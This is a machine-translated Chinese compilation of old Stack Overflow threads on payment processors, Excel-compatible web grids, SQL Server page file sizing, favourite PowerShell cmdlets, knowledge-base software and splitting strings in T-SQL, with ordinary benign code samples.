*免责声明：我是英国人，多年来与这些服务进行了许多集成，但是市场一直在变化，事情可能已经发生变化，您的里程可能会有所不同！我不是律师或会计师，如果您接受我的建议，那不是我的错 :)*

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2008-08-05T16:44:35.960

我会说 paypal 或[GoogleCheckout](https://checkout.google.com/sell/)。

Google Checkout 是 2% + .20 美元或免费的，具体取决于您在 adwords 上的花费。如果您在 adWords 上花费 1 美元，那么您在 Google 结帐上的下一个 10 美元是免费的。

[Paypal](https://www.paypal.com/us/cgi-bin/webscr?cmd=_wp-standard-pricing-outside)为 1.9% 至 2.9% + 0.30 美元（每月 30,000 美元以下为 2.9%，每月超过 100,000 美元为 1.9%）

如果不考虑 20/30 美分，如果您每月的销售额超过 100,000 美元，并且不花任何广告词，Paypal 的价格就会便宜一点。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-08-05T16:53:28.033

[http://www.authorize.net/](http://www.authorize.net/)效果很好。这种类型的解决方案将允许您的客户直接输入他/她的信用卡。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-05-22T21:20:20.067

我一直在研究 Google Checkout。如果您像我一样需要订阅（定期付款） - Google Checkout 有它，但它仍处于测试阶段。因此，根据您想要上线的时间和您的需求 - 您可能想要使用其他东西。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-08-05T17:35:24.157

***转售***

如果您销售的是数字产品，我推荐[http://www.esellerate.net/](http://www.esellerate.net/)。他们很好地支持网站支付、销售时提供序列号，甚至还有 API，因此您可以将购买流程集成到您的应用程序中，以防它是桌面应用程序。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-08-05T17:40:27.503

那么便宜是指手续费还是月费？这也适用于微交易还是普通交易？以我的经验，PayPal 是一个全方位的好选择，因为它提供了适合大多数需求的专业级支付处理服务。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-08-05T17:48:39.467

我过去使用过 Cyber​​Source，并且体验很好。它们支持包括 SOAP 在内的多种界面，可以在国际范围内工作，并且具有非常好的 Web 界面。

我不确定它是否便宜。

[http://www.cybersource.com/products_and_services/global_payment_services/credit_card_processing/](http://www.cybersource.com/products_and_services/global_payment_services/credit_card_processing/)

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-08-05T18:49:46.830

我过去看过 WorldPay 和 SecPay；我认为，您需要了解您的洋葱才能胜任地使用它们-无论如何，如果您想要非常好的集成。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-09-19T17:39:52.450

非美国公司无法使用 Google Checkout。直到我研究的最后阶段我才意识到这一点，所以我觉得它很烦人（考虑到它很容易使用并且有很好的文档记录）。

不幸的是，为了让您的最终用户尽可能方便，您几乎不得不*支持*Paypal。就注册用户而言，没有其他人能与之相提并论。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-08-05T16:49:21.270

Epoch 相当大，可在美国和欧盟使用：

[http://www.epoch.com/en/index.html](http://www.epoch.com/en/index.html)

我不知道他们的条件。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-08-05T16:52:43.090

我不得不去paypal。我过去用过它，它真的很不痛。您需要做的就是创建一个帐户，它会自动提供给您。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-07-09T21:41:55.820

试试 AlertPay，他们有非常有竞争力的费用。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-07-09T22:00:13.850

[alertpay](http://www.alertpay.com/)看起来[费用很低](http://www.alertpay.com/info/Fees.aspx)（与 paypal 相比），支持更多国家，[开发者中心](http://dev.alertpay.com/)

# excel - 什么是接受 Excel 剪贴板数据的基于 Web 的良好网格？

> ID：2563
> 
> 赞同：8
> 
> 时间：2008-08-05T16:47:28.873
> 
> 标签：excel, csv, grid, clipboard

对于将接受粘贴的 Excel 数据并可以在复制期间发出与 Excel 兼容的剪贴板数据的平台无关（即 Javascript）网格控件/插件有什么好的建议吗？

我相信 Excel 数据在“正常”剪贴板操作期间被格式化为 CSV。

* * *

[dhtmlxGrid](http://dhtmlx.com/docs/products/dhtmlxGrid/)看起来很有希望，但在线演示实际上并没有将内容复制到我的剪贴板！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-08-05T17:23:21.500

不是答案，而是警告：我的公司仅为 Grid 购买了 2007 Infragistics ASP.NET 控件，我们对这个选择感到遗憾。

API 的质量很糟糕（至少在我们看来），使得针对网格进行编程非常困难（例如，不一致的命名约定，但这只是一种不便，我们也对对象模型有抱怨）。

所以我不能说我知道更好的选择，我只知道在再次购买 Infragistics 产品之前我会尝试其他东西（而且我们得到的电子邮件支持也很糟糕）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-08-05T20:27:23.810

我目前正在使用**dhtmlxGrid**，并且我们可以使用 Excel 复制/粘贴功能。dhtmlXGrid 是我发现的功能最全的 javascript 网格包。

在他们的网站上，dhtmlXGrid 声称在专业版中支持[剪贴板功能。](http://dhtmlx.com/docs/products/docsExplorer/index.shtml?node=dhtmlxgrid&type=smpl)（但是，我注意到他们网站上的示例不适用于我的 Firefox。编辑：这可能是 Nathan 提到的权限问题。）

无论如何，我们必须做一些额外的工作才能获得我们想要的准确的 Excel 复制和粘贴功能。我们基本上必须重写它们的一些功能才能获得所需的行为。他们的支持很好地帮助我们提出了解决方案。

因此，要回答您的问题，如果您购买专业版，您应该能够让他们支持复制和粘贴。我只是警告您，可能需要一些额外的工作来微调该行为。

总的来说，我对 dhtmlXGrid 很满意。我们使用了很多他们的功能。他们的支持非常好。由于他们在欧洲（我认为），他们通常需要一天的时间才能做出回应。Javascript 本质上是开源的，所以我可以在需要时随时投入。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-08-05T19:32:40.100

几年前（我认为是 2004 年）我一直在努力解决这个问题。我们遇到了 Firefox 默认不允许脚本读取剪贴板的问题（但您可以[授予对剪贴板的访问权限](http://support.mozilla.com/en-US/kb/Granting+JavaScript+access+to+the+clipboard)）。

还有其他读取剪贴板数据的方法……例如，Flash 可以读取剪贴板。[有一篇关于ajaxian](http://ajaxian.com/archives/auto-copy-to-clipboard)的好文章来解释如何在幕后做到这一点。

最后，我们找不到符合要求的基于 Web 的 Grid，因此我们不得不混合使用 Actionscript 和 Javascript 创建自己的网格。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-09T16:07:26.220

我不想在这里成为显而易见的船长……但是一个普通的旧 .NET Gridview 控件呢？您可以将 Excel 数据复制到其中并从中复制出来……您可以在任何安装了 .NET 平台的系统上运行它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-09-17T19:48:53.697

[http://dhtmlx.com/dhxdocs/doku.php?id=dhtmlxgrid:clipboard_operations](http://dhtmlx.com/dhxdocs/doku.php?id=dhtmlxgrid:clipboard_operations)

# sql-server - 适用于 SQL Server 的 Windows O/S 页面文件大小

> ID：2588
> 
> 赞同：19
> 
> 时间：2008-08-05T17:07:16.773
> 
> 标签：sql-server, windows

有没有人知道运行 SQL Server 的 Windows 2003 服务器的适当页面文件大小的良好经验法则？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2011-10-05T21:39:39.720

尽管对 Remus（我非常尊重他）表示了应有的尊重，但我强烈反对。如果您的页面文件足够大以支持完整转储，则它将每次执行完整转储。如果你有大量的 RAM，这可能会导致一个小问题变成重大中断。

如果存在一次性瞬态问题，您不希望您的服务器必须将 1 TB 的 RAM 写入磁盘。如果问题反复出现，您可以增加页面文件以捕获完整转储。我会等到您受到 PSS（或其他有资格分析完整转储的人）的指示，要求您捕获完整转储时再执行此操作。极少数 DBA 知道如何分析完整转储。一个小型转储足以解决大多数出现的问题。

另外，如果您的服务器配置为允许 1 TB 完全转储并且出现重复出现的问题，您建议手头有多少可用磁盘空间？您可以在一个周末填满整个 SAN。

在您有幸拥有具有 3 或 4 GB RAM 的 SQL Server 的日子里，页面文件 1.5*RAM 是常态。现在不再是这种情况了。我将页面文件保留为所有生产服务器上的 Windows 默认大小和设置（遇到内存压力的 SSAS 服务器除外）。

为了澄清起见，我使用过从 2 GB RAM 到 2 TB RAM 的服务器。11 年多之后，我只需要增加页面文件来捕获一次完整的转储。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-11-22T22:11:18.923

与 RAM 的大小无关，您仍然需要一个至少是物理 RAM 量 1.5 倍的页面文件。即使您有一台 1 TB RAM 的机器也是如此，您将需要 1.5 TB 的页面文件在磁盘上（听起来很疯狂，但确实如此）。

当进程通过 VirtualAlloc/VirtualAllocEx 请求 MEM_COMMIT 内存时，需要在页面文件中保留请求的大小。这在第一个 Win NT 系统中是正确的，今天仍然是正确的，请参阅[在 Win32 中管理虚拟内存](http://msdn.microsoft.com/en-us/library/ms810627.aspx)：

> 提交内存时，会分配内存的物理页**并在页面文件中保留空间**。

在一些极端奇怪的情况下，SQL Server 总是会请求 MEM_COMMIT 页面。鉴于 SQL 使用[动态内存管理](http://msdn.microsoft.com/en-us/library/ms178145.aspx)策略，该策略预先保留尽可能多的缓冲池（根据 VAS 保留和*提交*），SQL Server 将在启动时请求页面文件中的大量空间保留。如果页面文件大小不合适，错误 801/802 将开始出现在 SQL 的 ERRORLOG 文件和操作中。

这总是会引起一些混乱，因为管理员错误地认为大 RAM 消除了对页面文件的需要。事实上，恰恰相反，大 RAM 会增加对页面文件的需求，这仅仅是因为 Windows NT 内存管理器的内部工作原理。希望保留的页面文件从未使用过。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2010-08-03T18:58:10.880

根据微软的说法，“随着计算机中 RAM 数量的增加，对页面文件的需求会减少。” **然后，本文继续描述如何使用性能日志来确定实际**使用了多少页面文件。尝试将您的页面文件设置为 1.5X 系统内存作为开始，然后进行推荐的监控并从那里进行调整。

[如何为 64 位版本的 Windows 确定适当的页面文件大小](http://support.microsoft.com/kb/889654)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-23T14:45:57.940

应用程序工作集的大小越大越好，您将开始进入收益递减状态。您可以尝试通过缓慢增加或减小大小来找到这一点，直到您看到缓存命中率发生显着变化。但是，如果缓存命中率超过 90% 左右，您可能就可以了。通常，您应该在生产系统上密切关注这一点，以确保它没有超出其 RAM 分配。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-09-10T05:05:52.373

我们最近在我们的一个 SQL Server 中遇到了一些性能问题，我们无法完全缩小范围，实际上使用了我们的一张 Microsoft 支持票让他们帮助进行故障排除。与 SQL Server 一起使用的最佳页面文件大小出现了，Microsoft 的建议是它是**RAM 量的 1 1/2 倍**。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-08-11T12:22:31.097

如果您正在寻找高性能，您将希望完全避免分页，因此页面文件大小变得不那么重要。为数据库服务器投资尽可能多的 RAM。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2011-05-24T12:47:26.453

经过大量研究，我们在 Windows 2003 Enterprise x64 上运行 Enterprise x64 的专用 SQL Server 没有页面文件。

简单地说，页面文件是由操作系统管理的文件的缓存，SQL 有自己的内部内存管理系统。

引用的 MS 文章不证明该建议适用于运行开箱即用服务（如文件共享）的操作系统。

拥有页面文件只会增加磁盘 I/O 的负担，因为 Windows 试图提供帮助，而只有 SQL OS 可以完成这项工作。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2014-04-03T23:51:13.013

在这种情况下，1.5 倍总物理 RAM 的正常建议并不是最好的。这个非常普遍的建议是在所有内存都被“正常”进程使用的假设下提供的，这些进程通常可以将其最少使用的页面移动到磁盘，而不会为内存所属的应用程序进程产生大量性能问题。

对于运行 SQL Server 的服务器（通常具有非常大的 RAM），大部分物理 RAM 都提交给 SQL Server 进程，并且应该（如果配置正确）锁定在物理内存中，防止它被分页到页面文件. SQL Server 非常谨慎地管理自己的内存并考虑到性能，使用分配给其进程的大部分 RAM 作为数据缓存来减少磁盘 I/O。将这些数据缓存页面分页到页面文件是没有意义的，因为首先将这些数据放在 RAM 中的唯一目的是减少磁盘 I/O。（注意，Windows 操作系统也使用可用 RAM 作为磁盘缓存来加速系统运行。）由于 SQL Server 已经管理了自己的内存空间，所以这个内存空间不应该被认为是“可分页的”，

关于 Remus 提到的 MEM_COMMIT，该术语令人困惑，因为在虚拟内存用语中，“保留”从不指实际分配，而是指防止另一个进程使用地址空间（而不是物理空间）。可“提交”的内存基本上等于物理 RAM 和页面文件大小的总和，执行 MEM_COMMIT 只会减少已提交池中可用的数量。当时它不会*在*页面文件中分配匹配的页面。当实际写入已提交的内存页面时，即虚拟内存系统将分配一个物理内存页面并可能将另一个内存页面从物理 RAM 碰撞到页面文件。请参阅 MSDN 的[VirtualAlloc 函数](http://msdn.microsoft.com/en-us/library/aa366887.aspx)参考。

Windows 操作系统跟踪应用程序进程和它自己的磁盘缓存机制之间的内存压力，并决定何时应该将非锁定内存页面从物理内存页面碰撞到页面文件。我的理解是，与实际的非锁定内存空间相比，拥有一个太大的页面文件可能会导致 Windows 过分热心地将应用程序内存分页到页面文件，从而导致这些应用程序遭受页面丢失的后果（性能缓慢）。

只要服务器没有运行其他需要大量内存的进程，4GB 的页面文件大小就足够了。如果您已将 SQL Server 设置为允许在内存中锁定页面，则还应考虑设置 SQL Server 的最大内存设置，以便为操作系统和其他进程保留一些可用的物理 RAM。

802 errors in SQL Server indicate that the system cannot commit any more pages for the data cache. Increasing the pagefile size will only help in this situation insofar as Windows is able to page out memory from non-SQL Server processes. Allowing SQL Server memory to grow into the pagefile in this situation might get rid of the error messages, but it is counterproductive, due to the point earlier about the reason for the data cache in the first place.

# powershell - 你最喜欢的 Powershell Cmdlet 是什么？

> ID：2630
> 
> 赞同：15
> 
> 时间：2008-08-05T18:01:32.547
> 
> 标签：powershell, cmdlets

我刚刚找到了 /n 软件免费的 Powershell NetCmdlets，在玩过它们之后，我喜欢它们为命令行带来的功能。所以它提出了一个问题，你最喜欢的 Cmdlet 是什么，你如何使用它们？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-08-08T00:02:35.653

有一个我用来发布到 Twitter的[out-twitter 脚本。](http://blog.sapien.com/index.php/2008/06/23/out-twitter/)这很好，因为这意味着您可以向 twitter 发送内容，而不会被浏览器分心。

我为它添加了一个别名，“twit”。

所以现在你可以输入，例如：

```
PS C:\>"trying out stack overflow" | twit 
```

如果成功提交，它将返回一个标识您的帖子的整数。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-09-15T16:51:56.900

作为一名程序员/黑客，`Get-Member`我`Get-Command`使用的比其他任何人都多，但我用来炫耀的是`Select-Control`WASP `Send-Keys`、[PowerGadgets](http://CodePlex.com/WASP)以及[我](http://PowerGadgets.com)自己用 WPF 针对 CTP2 或[PoshConsole](http://CodePlex.com/PoshConsole)编写的一些东西；-)

![PoshConsole 中的天气](../Images/ebd0e687a7929332bffd4ab07f283e46.png)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-09-15T21:09:54.797

获取会员，放下手。不，它不是很吸引人，但是交互式检查对象的能力胜过打断你的工作去访问 MSDN。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-07T18:31:20.110

**Set-Clipboard**，可在 CodePlex 上的 PowerShell 社区扩展项目中找到。通常当我在 PowerShell 中工作时，最终目标是生成一些文本甚至是 Excel 电子表格。Set-Clipboard 消除了所有中间“将其保存到文件，现在打开该文件，全选，复制到剪贴板”步骤——您可以在 PowerShell 中完成所有操作。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-08-07T13:11:06.657

我编写了一个 PowerShell 提供程序，让我可以访问 IE7 的 RSS 提要商店，并且从中获得了很多乐趣。

它让我可以使用和导航`cd`到一个名为的驱动器`feed:`并在文件夹和提要中导航。 它甚至允许您从命令行添加或删除提要。`cd``dir`

以我博客上的这篇文章为例：

[在您的提要中获得最多产的作者](http://www.madprops.org/blog/getting-the-most-prolific-authors-in-your-feeds/)

[如今，它已整合到 PowerShell 社区扩展项目中，您可以在此处](http://www.codeplex.com/PowerShellCX)的 CodePlex 上找到该项目。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-08-13T18:19:07.350

虽然它不如 Out-Twitter 有趣，但我最喜欢的 cmdlet 是 Get-Member，因为它允许我检查我正在使用的任何对象并找出新的属性和方法，以及底层类型目的。

如果我没有选择 Get-Member，我将不得不使用 PowerShell 社区扩展 (PSCX) 中的 Out-Clipboard，因为它可以实现大量剪贴板自动化，并使使用 PowerShell 进行代码模板变得更加容易。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-08-14T18:20:02.210

嗯，这有点乏味，但我会投票给 Get-Help。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-15T19:09:14.933

**导出-csv**。这将以易于管理的 Excel 格式创建一个漂亮的报告。如果您安装了社区扩展和用户**send-smtpmail ，则可以获得**奖励积分。

从命令行的收件箱中的管理报告。好的。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-08-05T18:53:44.950

虽然与您的问题半相关，但它并不完全符合 Powershell NetCmdlets 主题。但是我想无论如何都会发布它，因为我每天都在使用它，它可能会帮助其他人。只需将 shift-control-c 组合键组合成显示 Visual Studio 命令提示符即可。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-08-17T20:23:44.167

ls (Get-ChildItem) rm (Remove-Item) ps (Get-Process)

以及我现在“正常工作”的其他熟悉命令:)

但说真的……新对象必须得到我的投票。有了它，powershell 可以做任何事情:)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-06T18:03:26.110

我发现 Get-member 是最有用的本机 PowerShell cmdlet。我也每天使用 Get-WMIObject。即使我正在为某人解决 VBScript 问题，我也会求助于 Get-WMIObject，因为我可以交互地使用 WMI。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-10T13:17:34.880

Get-WMIObject 和 Get-Member 的组合是我在整个工作日使用的东西。在 Get-Sandwich 上工作。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2011-08-22T14:59:32.567

我使用 Microsoft Lync 2010 做了很多工作，其中包括一组用于测试功能的合成。其中 Test-CsPstnOutboundCall 是我最喜欢的。

对于一般脚本，必须投票给 get-member 和 get-help :)

# language-agnostic - 有哪些基于 Web 的知识库解决方案？

> ID：2639
> 
> 赞同：12
> 
> 时间：2008-08-05T18:07:26.213
> 
> 标签：language-agnostic

我使用了 WordPress 博客和螺丝转 Wiki（在两个不同的工作中）来存储私人的、公司特定的 KB 信息，但我正在寻找一些被创建为知识库的东西。具体来说，我想看看：

*   免费/低成本
*   用户订阅 KB（或仅部分）以获取更新的简单方法
*   能够进行页面版本控制/审核更改
*   限制某些用户对某些页面的访问
*   发布/编辑文章的非常简单的方法
*   给文章添加图片的非常简单的方法
*   出色（快速、准确）的搜索能力
*   能够对文章进行评分和评论

我喜欢使用 Wordpress 博客，因为它允许我使用[Live Writer](http://get.live.com/)添加/编辑文章和图像，但它没有页面版本控制（我可以看到）。

我喜欢使用Screwturn wiki，因为它能够跟踪文章版本，而且我喜欢它简洁的外观，但是一些非技术人员对输入和编辑犹豫不决。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-08-05T19:09:08.213

我赞同卢克的回答。

我可以推荐[Confluence](http://www.atlassian.com/software/confluence/)，原因如下：我广泛测试了许多基于 Wiki 的商业和免费解决方案。没有一个人是所有账户的赢家，包括汇合。让我通过总结我学到的痛苦和重要的东西来尝试使您的任务更短：

*   所见即所得是企业最有的功能。没有它的wiki，跳过它
*   说，实际上，所见即所得并不完美。它更像是一个功能，你必须让普通用户不害怕怪物，并开始使用它。但是您和任何想要认真创建内容的人都会很快习惯 wiki 标记。它更快更可靠。
*   您需要良好的权限控制（谁可以查看、编辑页面等）。confluence 很好，但我有我的抱怨（放在这里很复杂）
*   您将需要一个良好的*导出*功能。大多数会为您提供单页“PDF”导出，但您需要更多。例如，假设您有一个常见问题解答，您想导出整个常见问题解答，对吗？那行得通吗？
*   宏：您想要一个创建宏的社区。例如，您询问了对页面进行**评分**的能力，这是一个指向 Confluence 宏的[链接](http://confluence.atlassian.com/display/CONFEXT/Rate+Macro)，可让您做到这一点
*   结构：您希望能够说一个页面是不同页面的子页面，并且能够浏览数据。没有结构的孤立页面的维基百科模型在企业版中不起作用。（想想FAQ，你想有一个层次不？）
*   能够*轻松*附加图片以嵌入页面/文章的正文。在 confluence 中，您需要上传图像然后可以嵌入它，它可能会更好一些（CTR+V），但我想这对于 80% 的用户来说已经足够简单了。

归根结底，请记住，Wiki 越灵活，对您就越有价值。它需要是一个“空白”的画布，然后你的想象力被用来“构建”应用程序。在 Confluence 中，我发现了 3 个关于如何创建常见问题解答的不同“最佳实践”。这意味着我可以实现很多东西。

一些例子（我用我的维基）

*   常见问题解答：任何错误，都会记录问题。由 PS 和 ENG 使用。显着减少内部支持时间
*   跟踪帐户状态：我实现了复杂的“仪表板”，您可以一目了然地看到哪个客户处于什么状态、他们拥有的软件版本、公司中谁“拥有”客户等
*   产品：所有文档、安装说明、“新功能”等
*   技术文档、数据库结构和表格的含义
*   HR：联系人列表、文档存储库

我的亚军（15 个月前）是免费[的 Deki_Wiki](http://wiki.developer.mindtouch.com/Deki_Wiki)，时间已经过去了，所以我不知道这是否仍然是我的亚军。

祝你好运！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-08-05T18:45:29.960

我也一直在研究用作 KB 的 wiki 软件，但要找到易于非技术人员使用的东西是很棘手的。有许多 wiki 试图提供所见即所得编辑，但我发现的大多数软件都会从所见即所得编辑器生成令人讨厌的低效 html 标记。

一个值得注意的例外是[Confluence](http://www.atlassian.com/software/confluence/)，它从 WYSIWYG 编辑器生成 wiki 语法。这仍然不是完美的（给我看一个所见即所得的编辑器），但是在为喜欢它的人保留简单的 wiki 语法和允许非技术用户贡献内容之间取得了很好的折衷。唯一的问题是 Confluence 不是免费的（25 个用户许可证需要 1,200 美元）。

编辑：我也尝试过 DekiWiki，虽然 UI 很好，但似乎还没有为黄金时段做好准备（深受上述所见即所得输出疾病的影响）。他们似乎也缺乏方向，因为完成相同任务的方式有很多。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-08-05T18:12:14.223

[Cerberus](http://www.cerberusweb.com/) - 它更像是一个功能齐全的帮助台/问题跟踪系统，但它内置了一个不错的 KB 解决方案。它可以是免费的，但他们确实有一个非常好的低成本付费版本。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-08-05T18:31:19.677

我认为 Drupal 是一个非常可能的选择。它有很多对书籍类型信息捕获的内置支持。

并且有丰富的用户生成模块集合，您可以使用它们来增强功能。

我认为它几乎具有您要求的所有开箱即用功能。
[Drupal CMS 的好处](http://drupal.org/features)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-08-06T05:49:40.900

我个人为此目的使用[MediaWiki 。](http://www.mediawiki.org/wiki/MediaWiki)我尝试了许多其他免费和付费的 wiki（包括[Confluence](http://www.atlassian.com/software/confluence/)），并且一直对 MediaWiki 的简单性和易用性印象深刻。

我在拇指驱动器上安装了 MediaWiki（使用PortableApps[中的](http://portableapps.com/)[XAMPP](http://portableapps.com/apps/development/xampp)），我主要将其用作个人知识库/代码片段存储库。无论我走到哪里，我都可以随身携带它，并从我正在使用的任何计算机上查看/编辑它。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-08-25T22:00:27.177

我们一直在使用

*   维基
*   用于代码库的 OpenGrok
*   使用网
*   基于 LotusNotes 的系统

只要有一个谷歌搜索工具指向这些东西，我认为只要人们使用它们就可以有任何或多个版本

# sql - 如何拆分字符串以便访问项目 x？

> ID：2647
> 
> 赞同：515
> 
> 时间：2008-08-05T18:15:47.727
> 
> 标签：sql, sql-server, tsql, split

使用 SQL Server，如何拆分字符串以便可以访问项目 x？

取一个字符串“Hello John Smith”。如何按空格拆分字符串并访问索引 1 处应返回“John”的项目？

* * *

## 回答 #1

> 赞同：365
> 
> 时间：2008-08-05T18:45:19.117

我不相信 SQL Server 有内置的拆分函数，所以除了 UDF，我知道的唯一其他答案是劫持 PARSENAME 函数：

```
SELECT PARSENAME(REPLACE('Hello John Smith', ' ', '.'), 2) 
```

PARSENAME 接受一个字符串并将其拆分为句点字符。它将一个数字作为第二个参数，该数字指定要返回的字符串的哪一段（从后到前）。

```
SELECT PARSENAME(REPLACE('Hello John Smith', ' ', '.'), 3)  --return Hello 
```

明显的问题是字符串已经包含句点。我仍然认为使用 UDF 是最好的方法......还有其他建议吗？

* * *

## 回答 #2

> 赞同：193
> 
> 时间：2008-08-05T18:28:38.653

您可能会在*[SQL User Defined Function to Parse a Delimited String](http://www.codeproject.com/KB/database/SQL_UDF_to_Parse_a_String.aspx)*中找到有用的解决方案（来自[The Code Project](http://en.wikipedia.org/wiki/The_Code_Project)）。

您可以使用这个简单的逻辑：

```
Declare @products varchar(200) = '1|20|3|343|44|6|8765'
Declare @individual varchar(20) = null

WHILE LEN(@products) > 0
BEGIN
    IF PATINDEX('%|%', @products) > 0
    BEGIN
        SET @individual = SUBSTRING(@products,
                                    0,
                                    PATINDEX('%|%', @products))
        SELECT @individual

        SET @products = SUBSTRING(@products,
                                  LEN(@individual + '|') + 1,
                                  LEN(@products))
    END
    ELSE
    BEGIN
        SET @individual = @products
        SET @products = NULL
        SELECT @individual
    END
END 
```

* * *

## 回答 #3

> 赞同：110
> 
> 时间：2008-08-05T18:57:03.137

首先，创建一个函数（使用 CTE，通用表表达式消除了对临时表的需要）

```
 create function dbo.SplitString 
    (
        @str nvarchar(4000), 
        @separator char(1)
    )
    returns table
    AS
    return (
        with tokens(p, a, b) AS (
            select 
                1, 
                1, 
                charindex(@separator, @str)
            union all
            select
                p + 1, 
                b + 1, 
                charindex(@separator, @str, b + 1)
            from tokens
            where b > 0
        )
        select
            p-1 zeroBasedOccurance,
            substring(
                @str, 
                a, 
                case when b > 0 then b-a ELSE 4000 end) 
            AS s
        from tokens
      )
    GO 
```

然后，像这样将它用作任何表（或修改它以适合您现有的存储过程）。

```
select s 
from dbo.SplitString('Hello John Smith', ' ')
where zeroBasedOccurance=1 
```

**更新**

对于长度超过 4000 个字符的输入字符串，以前的版本会失败。此版本解决了以下限制：

```
create function dbo.SplitString 
(
    @str nvarchar(max), 
    @separator char(1)
)
returns table
AS
return (
with tokens(p, a, b) AS (
    select 
        cast(1 as bigint), 
        cast(1 as bigint), 
        charindex(@separator, @str)
    union all
    select
        p + 1, 
        b + 1, 
        charindex(@separator, @str, b + 1)
    from tokens
    where b > 0
)
select
    p-1 ItemIndex,
    substring(
        @str, 
        a, 
        case when b > 0 then b-a ELSE LEN(@str) end) 
    AS s
from tokens
);

GO 
```

用法保持不变。

* * *

## 回答 #4

> 赞同：70
> 
> 时间：2013-11-12T17:16:08.703

这里的大多数解决方案都使用 while 循环或递归 CTE。我保证，如果您可以使用空格以外的分隔符，则基于集合的方法会更好：

```
CREATE FUNCTION [dbo].[SplitString]
    (
        @List NVARCHAR(MAX),
        @Delim VARCHAR(255)
    )
    RETURNS TABLE
    AS
        RETURN ( SELECT [Value], idx = RANK() OVER (ORDER BY n) FROM 
          ( 
            SELECT n = Number, 
              [Value] = LTRIM(RTRIM(SUBSTRING(@List, [Number],
              CHARINDEX(@Delim, @List + @Delim, [Number]) - [Number])))
            FROM (SELECT Number = ROW_NUMBER() OVER (ORDER BY name)
              FROM sys.all_objects) AS x
              WHERE Number <= LEN(@List)
              AND SUBSTRING(@Delim + @List, [Number], LEN(@Delim)) = @Delim
          ) AS y
        ); 
```

示例用法：

```
SELECT Value FROM dbo.SplitString('foo,bar,blat,foo,splunge',',')
  WHERE idx = 3; 
```

结果：

```
----
blat 
```

你也可以将`idx`你想要的作为参数添加到函数中，但我将把它作为练习留给读者。

您不能*仅*使用 SQL Server 2016 中添加的本[机`STRING_SPLIT`函数](https://docs.microsoft.com/en-us/sql/t-sql/functions/string-split-transact-sql)来执行此操作，因为无法保证输出将按原始列表的顺序呈现。换句话说，如果你传入，`3,6,1`结果可能是这个顺序，但也*可能*是`1,3,6`. 我已经请求社区帮助改进这里的内置功能：

*   [请帮助改进 STRING_SPLIT](https://sqlperformance.com/2020/03/t-sql-queries/please-help-string-split-improvements)

有了足够的*定性*反馈，他们实际上可能会考虑进行以下一些改进：

*   [STRING_SPLIT 功能不完整](https://feedback.azure.com/d365community/idea/5eaf994d-4025-ec11-b6e6-000d3a4f0da0)

有关拆分函数的更多信息，为什么（并证明）while 循环和递归 CTE 不能扩展，以及更好的替代方案，如果拆分来自应用程序层的字符串：

*   [以正确的方式拆分字符串 - 或次佳方式](http://www.sqlperformance.com/2012/07/t-sql-queries/split-strings)
*   [拆分字符串：后续行动](https://sqlperformance.com/2012/08/t-sql-queries/splitting-strings-follow-up)
*   [拆分字符串：现在使用更少的 T-SQL](http://www.sqlperformance.com/2012/08/t-sql-queries/splitting-strings-now-with-less-t-sql)
*   [比较字符串拆分/连接方法](https://sqlperformance.com/2016/01/t-sql-queries/comparing-splitting-concat)
*   [处理整数列表：我的方法](https://sqlblog.org/2009/08/01/processing-a-list-of-integers-my-approach)
*   [拆分整数列表：另一个综述](https://sqlblog.org/2010/07/07/splitting-a-list-of-integers-another-roundup)
*   [有关拆分列表的更多信息：自定义分隔符、防止重复和维护顺序](https://sqlblog.org/2009/08/06/more-on-splitting-lists-custom-delimiters-preventing-duplicates-and-maintaining-order)
*   [从 SQL Server 中的字符串中删除重复项](https://www.mssqltips.com/sqlservertip/4140/removing-duplicates-from-strings-in-sql-server/?utm_source=AaronBertrand)

但是，在 SQL Server 2016 或更高版本上，您应该查看[`STRING_SPLIT()`](https://docs.microsoft.com/en-us/sql/t-sql/functions/string-split-transact-sql)and [`STRING_AGG()`](https://docs.microsoft.com/en-us/sql/t-sql/functions/string-agg-transact-sql)：

*   [性能惊喜和假设：STRING_SPLIT()](https://sqlperformance.com/2016/03/sql-server-2016/string-split)
